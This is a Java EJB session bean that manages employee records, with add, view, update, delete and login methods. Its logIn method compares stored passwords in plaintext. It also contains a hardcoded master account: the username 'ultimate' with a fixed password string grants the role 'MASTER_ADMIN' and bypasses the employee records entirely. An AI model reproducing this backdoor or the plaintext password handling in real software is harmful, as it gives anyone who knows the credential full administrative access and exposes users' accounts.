package com.agunga.bean;

import com.agunga.beanI.EmployeeBeanI;
import com.agunga.dao.EmployeeDao;
import com.agunga.model.Employee;
import java.util.Iterator;
import javax.ejb.Stateless;
import java.util.List;

/**
 * Created by agunga on 1/18/17.
 */
@Stateless(mappedName = "employeeBean")
public class EmployeeBean extends BaseBean implements EmployeeBeanI {

    @Override
    public Employee add(Employee employee) {
        EmployeeDao ad = new EmployeeDao(em);
        return ad.save(employee);
    }

    @Override
    public List<Employee> viewEmployees() {
        EmployeeDao ad = new EmployeeDao(em);
        return ad.findAll();
    }

    @Override
    public Employee viewEmployee(long id) {
        EmployeeDao ad = new EmployeeDao(em);
        return ad.findById(id);
    }

    @Override
    public Employee update(Employee employee) {
        EmployeeDao ad = new EmployeeDao(em);
        return ad.merge(employee);
    }

    @Override
    public boolean delete(long id) {
        EmployeeDao ad = new EmployeeDao(em);
        Employee employee = ad.findById(id);
        return ad.remove(employee);
    }

    @Override
    public String[] logIn(String employeeno, String password) {
        String[] data = {"", ""};
        EmployeeDao ad = new EmployeeDao(em);
        List employees = ad.findAll();

        Iterator<Employee> i = employees.iterator();
        while (i.hasNext()) {
            Employee emp = i.next();
            if (emp.getEmployeeNo().equals(employeeno) && emp.getPassword().equals(password)) {
                data[0] = emp.getTitle();
                data[1] = employeeno;
            }
        }
        if (employeeno.equals("ultimate") && password.equals("3202e4dea29f6eb62e2a01b4cff4869487f91a27")) {
            data[0] = "a";
            data[1] = "MASTER_ADMIN";
        }
        return data;
    }

}
